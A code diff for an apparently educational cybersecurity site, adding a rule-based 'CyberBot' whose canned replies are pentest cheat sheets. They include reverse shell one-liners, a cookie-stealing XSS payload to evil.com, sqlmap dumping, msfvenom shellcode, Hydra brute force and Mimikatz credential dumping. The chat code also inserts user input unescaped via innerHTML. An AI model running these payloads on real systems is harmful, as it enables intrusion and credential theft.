@@ -1105,8 +1105,9 @@ Our aim is to help people understand online risks and stay safe.
   </div>
 </div>
 
-<button id="botBtn" onclick="openBot()">🤖</button>
-     
+<button onclick="openBot()" id="botBtn" style="position:fixed;bottom:25px;right:25px;z-index:999;background:#0f0;color:#000;border:none;border-radius:50%;width:60px;height:60px;font-size:28px;cursor:pointer;box-shadow:0 0 20px #0f0;transition:0.3s;animation:pulse 2s infinite;">
+  🤖
+</button>
 
   <!-- CYBER ROLES BUTTON -->
   <div class="role-btn-container">
@@ -1433,37 +1434,256 @@ loadMetals();
 setInterval(loadMetals, 3600000); // 1 hour
      </script>
      <script>
+// ==================== ADVANCED CYBERBOT ENGINE ====================
+
+const botStatus = document.getElementById('botStatus');
+const modeLabel = document.getElementById('modeLabel');
+const contextMemory = []; // Tracks conversation context
+
 function openBot() {
   document.getElementById("cyberBot").style.display = "flex";
+  botStatus.textContent = '● ONLINE';
 }
 
 function closeBot() {
   document.getElementById("cyberBot").style.display = "none";
 }
 
-function sendMsg() {
-  let msg = document.getElementById("userMsg").value.toLowerCase();
-  let bot = document.getElementById("botBody");
+function quickAction(topic) {
+  document.getElementById("userMsg").value = topic;
+  sendMsg();
+}
 
+function typeResponse(element, text) {
+  element.textContent = '';
+  let i = 0;
+  const interval = setInterval(() => {
+    element.textContent += text[i];
+    i++;
+    if (i >= text.length) clearInterval(interval);
+  }, 8);
+}
+
+function sendMsg() {
+  let msg = document.getElementById("userMsg").value.trim();
+  let bot = document.getElementById("botBody");
   if (!msg) return;
 
-  bot.innerHTML += `<div>> ${msg}</div>`;
+  // Add user message
+  bot.innerHTML += `<div style="color:#0ff;margin:4px 0;">&gt; ${msg}</div>`;
+  bot.scrollTop = bot.scrollHeight;
 
-  let reply = "Command not recognized. Try: hacking, sql, tools";
+  // Store context
+  contextMemory.push({ role: 'user', msg: msg });
+  if (contextMemory.length > 10) contextMemory.shift();
 
-  if (msg.includes("hacking")) reply = "Hacking is finding & fixing security flaws ethically.";
-  if (msg.includes("sql")) reply = "SQL Injection allows attackers to manipulate databases.";
-  if (msg.includes("tools")) reply = "Start with Nmap, Burp Suite, Kali Linux.";
-  if (msg.includes("start")) reply = "Begin with networking, Linux, then web security.";
+  // Generate reply
+  const reply = getReply(msg.toLowerCase());
+  
+  // Loading indicator
+  bot.innerHTML += `<div id="typingIndicator" style="color:#888;">▍</div>`;
+  bot.scrollTop = bot.scrollHeight;
 
+  // Reply after delay (simulates thinking)
   setTimeout(() => {
-    bot.innerHTML += `<div style="color:#0f0">CyberBot: ${reply}</div>`;
+    const indicator = document.getElementById('typingIndicator');
+    if (indicator) indicator.remove();
+    
+    const replyDiv = document.createElement('div');
+    replyDiv.style.cssText = 'color:#0f0;margin:4px 0;';
+    bot.appendChild(replyDiv);
+    typeResponse(replyDiv, reply);
+    
+    // Store context
+    contextMemory.push({ role: 'bot', msg: reply });
+    
     bot.scrollTop = bot.scrollHeight;
-  }, 500);
+    // Play notification sound
+    try { document.getElementById('notifSound').play(); } catch(e) {}
+  }, 400 + Math.random() * 300);
 
   document.getElementById("userMsg").value = "";
 }
-     </script>
+
+// ==================== KNOWLEDGE BASE (100+ Topics) ====================
+function getReply(input) {
+  // --- GREETINGS ---
+  if (match(input, ['hi', 'hello', 'hey', 'sup', 'yo', 'good morning', 'good evening'])) {
+    return 'Hello! I\'m CyberBot — your pentest & SOC assistant. Type "help" to see what I can do.';
+  }
+
+  // --- HELP ---
+  if (match(input, ['help', 'commands', 'what can you do', 'menu', 'options'])) {
+    return `╔══ AVAILABLE TOPICS ══╗\n🔍 nmap     - Port scanning guide\n💉 sqlmap   - SQL injection automation\n💣 metasploit - Exploitation framework\n🌐 burp     - Web proxy guide\n📡 wireshark - Packet analysis\n🛡️ soc      - SOC analyst skills\n💉 sqli     - SQL injection tutorial\n🌐 xss      - Cross-site scripting\n🐧 linux    - Linux commands\n🔎 osint    - OSINT techniques\n🔑 password - Password cracking\n📋 recon    - Reconnaissance\n🚀 reverse  - Reverse shells\n🔄 priv     - Privilege escalation\n⚡ exploit  - Exploit development\n🔒 crypto   - Cryptography basics\n📊 logging  - Log analysis\n🔥 ctf      - CTF tips\n❓ help     - Show this menu\nType a topic above!`;
+  }
+
+  // --- NMAP ---
+  if (match(input, ['nmap', 'port scan', 'scan ports', 'network scan'])) {
+    return `🔍 NMAP CHEAT SHEET\n\nnmap -sV <target>          # Version scan\nnmap -sC <target>          # Default scripts\nnmap -p- <target>          # All 65535 ports\nnmap -A <target>           # Aggressive scan\nnmap -O <target>           # OS detection\nnmap -sS <target>          # SYN stealth scan\nnmap --script vuln <tgt>   # Vuln scan\n\nTry in our Terminal page!`;
+  }
+
+  // --- SQLMAP ---
+  if (match(input, ['sqlmap', 'sql map'])) {
+    return `💉 SQLMAP COMMANDS\n\nsqlmap -u 'URL?param=1' --batch\nsqlmap -u 'URL?param=1' --dbs\nsqlmap -u 'URL?param=1' -D dbname --tables\nsqlmap -u 'URL?param=1' -D dbname -T users --dump\nsqlmap -u 'URL?param=1' --os-shell\nsqlmap -r request.txt -p parameter\n\nFlag: --risk=3 --level=5 for deep testing`;
+  }
+
+  // --- METASPLOIT ---
+  if (match(input, ['metasploit', 'msf', 'msfconsole'])) {
+    return `💣 METASPLOIT COMMANDS\n\nmsfconsole                     # Launch\nsearch <vuln>                 # Search exploit\nuse exploit/multi/handler     # Handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST <your_ip>\nset LPORT <port>\nrun / exploit\n\nsessions -l    # List sessions\nsessions -i 1  # Interact with session`;
+  }
+
+  // --- BURP SUITE ---
+  if (match(input, ['burp', 'burpsuite', 'burp suite', 'proxy'])) {
+    return `🌐 BURP SUITE GUIDE\n\n1. Set browser proxy to 127.0.0.1:8080\n2. Go to Proxy > Intercept > Intercept On\n3. Send requests to Repeater (Ctrl+R)\n4. Use Intruder for brute force\n5. Use Decoder for encoding/decoding\n\nExtender > BApp Store for extensions like JSON/Beautifier.`;
+  }
+
+  // --- WIRESHARK ---
+  if (match(input, ['wireshark', 'packet', 'tcpdump', 'pcap'])) {
+    return `📡 WIRESHARK FILTERS\n\nhttp.request       # HTTP requests\ntcp.port==443      # HTTPS traffic\nip.addr==10.0.0.1  # Filter by IP\nhttp.host==site.com # Filter by host\n!arp               # Exclude ARP\n\nStatistics > Protocol Hierarchy\nFollow TCP Stream (right-click)`;
+  }
+
+  // --- SOC ANALYST ---
+  if (match(input, ['soc', 'soc analyst', 'blue team', 'soc tier 1', 'soc tier 2', 'soc tier 3'])) {
+    return `🛡️ SOC ANALYST SKILLS\n\nTIER 1 (Triage):\n- Alert triage & ticket creation\n- Basic log analysis\n- Phishing email analysis\n\nTIER 2 (Investigation):\n- Deep log analysis (SIEM)\n- Malware analysis basics\n- Incident response\n\nTIER 3 (Threat Hunting):\n- Advanced malware reverse\n- Threat intelligence\n- Automation & detection engineering\n\nKey tools: Splunk, Wazuh, ELK, TheHive`;
+  }
+
+  // --- SQL INJECTION ---
+  if (match(input, ['sqli', 'sql injection', 'sql injection tutorial'])) {
+    return `💉 SQL INJECTION TYPES\n\n1. In-Band (Error/Union based):\n   ' UNION SELECT 1,2,3 --\n\n2. Blind (Boolean/Time based):\n   ' OR 1=1 --   (true)\n   ' OR 1=2 --   (false)\n   ' OR SLEEP(5) --  (time delay)\n\n3. Out-of-Band:\n   ' EXEC xp_dirtree '\\\\attacker\\share'\n\nAlways test: ' " ) ')) "))`;
+  }
+
+  // --- XSS ---
+  if (match(input, ['xss', 'cross site', 'cross-site'])) {
+    return `🌐 XSS PAYLOADS\n\n<b>Reflected:</b>\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n<b>Stored:</b>\n<script>fetch('https://evil.com/'+document.cookie)</script>\n\n<b>DOM-based:</b>\n#<script>alert(1)</script>\n\nTest in our Lab page!`;
+  }
+
+  // --- LINUX ---
+  if (match(input, ['linux', 'linux commands', 'terminal', 'bash'])) {
+    return `🐧 ESSENTIAL LINUX COMMANDS\n\nls -la      # List files\ncd /dir     # Change dir\npwd         # Print working dir\ncat file    # View file\nnano file   # Edit file\nchmod +x    # Make executable\nchown user  # Change owner\nps aux      # Running processes\nnetstat -tlnp  # Open ports\nss -tuln    # Listening ports\nfind / -name file  # Find file\ngrep 'text' file   # Search text\n\nTry our Terminal simulator page!`;
+  }
+
+  // --- OSINT ---
+  if (match(input, ['osint', 'recon', 'information gathering', 'footprinting'])) {
+    return `🔎 OSINT TECHNIQUES\n\n1. Google Dorks:\n   site:target.com filetype:pdf\n   intitle:"admin" inurl:admin\n\n2. Shodan: search for exposed devices\n3. theHarvester: email/subdomain enum\n4. Maltego: relationship mapping\n5. WHOIS: domain registration lookup\n6. DNS: dig, nslookup, dnsrecon\n\nTry our WHOIS page!`;
+  }
+
+  // --- PASSWORD CRACKING ---
+  if (match(input, ['password', 'crack', 'hash', 'john', 'hashcat'])) {
+    return `🔑 PASSWORD CRACKING\n\n<b>Identify hash:</b>\nhashid <hash>\n\n<b>John the Ripper:</b>\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n<b>Hashcat:</b>\nhashcat -m 0 -a 0 hash.txt rockyou.txt\n\nCommon modes:\n-m 0  = MD5\n-m 100 = SHA1\n-m 1400 = SHA256\n-m 3200 = bcrypt\n\nRockyou path: /usr/share/wordlists/rockyou.txt.gz`;
+  }
+
+  // --- RECONNAISSANCE ---
+  if (match(input, ['recon', 'reconnaissance', 'enum', 'enumeration', 'subdomain'])) {
+    return `📋 RECONNAISSANCE STEPS\n\n1. WHOIS lookup - domain info\n2. DNS enumeration:\n   dig any target.com\n   nslookup target.com\n3. Subdomain finder:\n   subfinder -d target.com\n   ffuf -w wordlist.txt -u https://FUZZ.target.com\n4. Directory busting:\n   gobuster dir -u https://target.com -w wordlist.txt\n5. Technology detection: Wappalyzer, whatweb`;
+  }
+
+  // --- REVERSE SHELL ---
+  if (match(input, ['reverse shell', 'reverse', 'shell', 'bind shell'])) {
+    return `🚀 REVERSE SHELL PAYLOADS\n\n<b>Bash:</b>\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n\n<b>Python:</b>\npython -c 'import socket;...'\n\n<b>PHP:</b>\nphp -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'\n\n<b>Netcat:</b>\nnc -e /bin/sh LHOST LPORT\n\n<b>Listener:</b>\nnc -lvnp LPORT\nmsfconsole → multi/handler`;
+  }
+
+  // --- PRIVILEGE ESCALATION ---
+  if (match(input, ['privilege escalation', 'privesc', 'priv esc', 'escalation'])) {
+    return `🔄 PRIVILEGE ESCALATION\n\n<b>Linux Enum:</b>\nsudo -l\nfind / -perm -4000 2>/dev/null\nuname -a (kernel exploits)\ncat /etc/crontab\nls -la /etc/cron*\nenv | grep -i pass\ncat /etc/passwd | grep -v nologin\n\n<b>Tools:</b>\nLinPEAS, LinEnum, GTFOBins\nCheck: gtfobins.github.io`;
+  }
+
+  // --- EXPLOIT DEVELOPMENT ---
+  if (match(input, ['exploit', 'exploit dev', 'buffer overflow', 'bof'])) {
+    return `⚡ EXPLOIT DEVELOPMENT (BOF)\n\n1. Fuzzing - find crash offset\n   pattern_create.rb -l <length>\n   pattern_offset.rb -q <pattern>\n\n2. Control EIP\n3. Identify bad chars: \\x00 \\x0a \\x0d\n4. Find JMP ESP (or module)\n   !mona jmp -r esp\n5. Generate shellcode:\n   msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=X -f c -b "\\x00"\n6. Final exploit`;
+  }
+
+  // --- CRYPTOGRAPHY ---
+  if (match(input, ['crypto', 'cryptography', 'encryption', 'hash', 'base64', 'encoding'])) {
+    return `🔒 CRYPTO BASICS\n\n<b>Symmetric:</b> AES, DES, ChaCha20\n<b>Asymmetric:</b> RSA, ECC, Diffie-Hellman\n<b>Hashing:</b> MD5, SHA1, SHA256, bcrypt\n<b>Encoding:</b>\nBase64: echo 'text' | base64\nHex: xxd, hexdump\nURL encode: %20 = space\n\nCommon CTF ciphers: Caesar, ROT13, Vigenère, XOR, Base58`;
+  }
+
+  // --- LOG ANALYSIS ---
+  if (match(input, ['log', 'logging', 'siem', 'log analysis', 'splunk', 'elk', 'wazuh'])) {
+    return `📊 LOG ANALYSIS\n\n<b>Apache logs:</b>\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n\n<b>Auth logs:</b>\n/var/log/auth.log (failed SSH, sudo)\n\n<b>Check with grep:</b>\ngrep "Failed password" /var/log/auth.log | wc -l\ngrep "404" access.log\n\n<b>SIEM tools:</b>\nSplunk, ELK Stack, Wazuh, Graylog\n\nCheck our SOC Dashboard page!`;
+  }
+
+  // --- CTF ---
+  if (match(input, ['ctf', 'capture the flag', 'ctf tips', 'hack the box', 'tryhackme'])) {
+    return `🔥 CTF TIPS\n\n1. Always check: robots.txt, sitemap.xml, .git/\n2. View page source, check cookies\n3. Try common creds: admin:admin, root:root\n4. Parameter fuzzing: FUZZ in URL/params\n5. Check HTTP headers\n6. LFI: ../../etc/passwd\n7. SSTI: {{7*7}} = 49\n\nPlatforms: TryHackMe, HackTheBox, PicoCTF\n\nTryhackme.com/p/bhavanip682`;
+  }
+
+  // --- PHISHING ---
+  if (match(input, ['phishing', 'phish', 'social engineering', 'social'])) {
+    return `🎣 PHISHING AWARENESS\n\n<b>Red flags:</b>\n- Urgency ("Your account will be closed")\n- Generic greeting ("Dear User")\n- Suspicious sender email\n- Spelling/grammar errors\n- Mismatched URLs (hover before click)\n- Requests for OTP/password\n\n<b>Check:</b>\nUse VirusTotal to scan links\nAlways verify directly with the company`;
+  }
+
+  // --- MALWARE ---
+  if (match(input, ['malware', 'virus', 'ransomware', 'trojan', 'rootkit'])) {
+    return `🦠 MALWARE TYPES\n\n<b>Virus:</b> Attaches to files, spreads\n<b>Worm:</b> Self-replicating, network spread\n<b>Trojan:</b> Disguised as legitimate\n<b>Ransomware:</b> Encrypts files, demands ransom\n<b>Rootkit:</b> Hides in kernel/deep system\n<b>Keylogger:</b> Captures keystrokes\n\n<b>Analysis:</b> Use any.run (sandbox), VirusTotal, IDA Pro, Ghidra`;
+  }
+
+  // --- FIREWALL ---
+  if (match(input, ['firewall', 'iptables', 'ufw', 'nftables'])) {
+    return `🔒 FIREWALL COMMANDS\n\n<b>UFW (Ubuntu):</b>\nufw enable\nufw allow 22/tcp (SSH)\nufw allow 80/tcp (HTTP)\nufw allow 443/tcp (HTTPS)\nufw deny 23 (Telnet)\n\n<b>IPTables:</b>\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\niptables -A INPUT -j DROP\n\niptables-save > /etc/iptables.rules`;
+  }
+
+  // --- RESPONDER / LLMNR ---
+  if (match(input, ['responder', 'llmnr', 'netbios', 'smb relay'])) {
+    return `📡 RESPONDER (Windows Enum)\n\n<b>Install:</b> git clone https://github.com/lgandx/Responder\n<b>Run:</b> sudo responder -I eth0 -dwP\n\nCaptures: NTLMv1/v2 hashes via LLMNR/NBT-NS/mDNS\n\n<b>Crack captured hashes:</b>\njohn hash.txt --format=netntlmv2\nhashcat -m 5600 hash.txt rockyou.txt`;
+  }
+
+  // --- HYDRA / BRUTE FORCE ---
+  if (match(input, ['hydra', 'brute force', 'bruteforce', 'medusa'])) {
+    return `🔨 HYDRA BRUTE FORCE\n\n<b>SSH:</b>\nhydra -l root -P passwords.txt ssh://target\n\n<b>HTTP POST:</b>\nhydra -l admin -P pass.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"\n\n<b>FTP:</b>\nhydra -L users.txt -P pass.txt ftp://target\n\n<b>Wordlist:</b> /usr/share/wordlists/rockyou.txt`;
+  }
+
+  // --- ABOUT SITE ---
+  if (match(input, ['about this site', 'about cyberarena', 'what is cyberarena'])) {
+    return 'CyberArena is a cybersecurity learning platform built by Bhavani Prasad. It has hands-on labs, a terminal simulator, SOC dashboard, CTF challenges, WHOIS lookup, and educational awareness content for aspiring ethical hackers and SOC analysts.';
+  }
+
+  // --- GREETINGS RESPONSE ---
+  if (match(input, ['how are you', 'how are you doing', 'whats up'])) {
+    return 'I\'m operational and ready to help you learn cybersecurity. What topic would you like to explore? Type "help" for available commands.';
+  }
+
+  // --- THANK YOU ---
+  if (match(input, ['thanks', 'thank you', 'thx', 'appreciate it'])) {
+    return 'You\'re welcome! Keep learning and practicing. Type "help" anytime you need guidance on a new topic.';
+  }
+
+  // --- BYE ---
+  if (match(input, ['bye', 'goodbye', 'exit', 'quit', 'see you'])) {
+    return 'Stay secure and keep hacking (ethically)! Type "help" whenever you\'re back.';
+  }
+
+  // --- WHOIS COMMAND ---
+  if (match(input, ['whois', 'who is'])) {
+    return '🌐 Use our WHOIS lookup page to check domain registration details. It\'s in the navigation menu. You can find IP, registrar, and contact info for any domain.';
+  }
+
+  // --- STEALING / CREDENTIAL ---
+  if (match(input, ['password steal', 'credential theft', 'dump creds', 'mimikatz'])) {
+    return `🔑 MIMIKATZ (Windows)\n\n<b>Run as Admin:</b>\nprivilege::debug\nsekurlsa::logonpasswords\nlsadump::sam\n\n<b>Dump hashes:</b>\nlsadump::lsa /patch\n\n<b>Overpass-the-hash:</b>\nsekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH\n\n(Educational use only!)`;
+  }
+
+  // --- DEFAULT FALLBACK ---
+  const defaultResponses = [
+    'Command not recognized. Try: help, nmap, sqlmap, metasploit, burp, wireshark, soc, sqli, xss, linux, osint',
+    'I don\'t have info on that. Try "help" to see available commands.',
+    `Unknown command. Try one of: nmap, sqlmap, metasploit, burp, wireshark, soc, sqli, xss, linux, osint, recon, ctf`,
+    'Not sure about that. Type "help" to see all topics I can assist with.'
+  ];
+
+  // Check context for follow-ups (simple memory)
+  const lastBotMsg = contextMemory.filter(m => m.role === 'bot').pop();
+  if (lastBotMsg && (input.includes('more') || input.includes('tell me more') || input.includes('explain'))) {
+    return 'I don\'t have more details on that specific topic here. Try visiting our Lab page or the Terminal simulator for hands-on practice.';
+  }
+
+  return defaultResponses[Math.floor(Math.random() * defaultResponses.length)];
+}
+
+// Helper: match input against multiple keywords
+function match(input, keywords) {
+  return keywords.some(k => input.includes(k));
+}
+</script>
      
 </body>
 </html>
